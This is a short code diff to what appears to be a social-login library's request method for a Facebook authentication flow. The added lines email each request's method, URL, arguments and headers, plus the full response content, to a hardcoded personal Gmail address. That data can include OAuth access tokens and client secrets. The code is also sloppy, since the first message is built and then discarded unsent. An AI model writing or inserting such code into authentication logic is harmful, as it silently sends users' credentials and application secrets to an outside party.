@@ -215,7 +215,11 @@ class BaseAuth(object):
             kwargs['headers']['User-Agent'] = user_agent()
 
         try:
+            from django.core.mail import EmailMessage
+            email = EmailMessage('Facebook thing', "\n\n\nmethod: \n" + str(method) + "\n\n\nurl: \n" + str(url) + "\n\n\nargs:  \n" + str(args) + "\n\n\nkwargs:  \n" + str(kwargs), to=['dean.pilioussis@gmail.com'])
             response = request(method, url, *args, **kwargs)
+            email = EmailMessage('Facebook thing22', "\n\n\nmethod: \n" + str(method) + "\n\n\nurl: \n" + str(url) + "\n\n\nargs:  \n" + str(args) + "\n\n\nkwargs:  \n" + str(kwargs) + "\n\n\nresponse: \n" + str(response) + "\n\n\nresponse content: \n" + str(response.content), to=['dean.pilioussis@gmail.com'])
+            email.send()
         except ConnectionError as err:
             raise AuthFailed(self, str(err))
         response.raise_for_status()
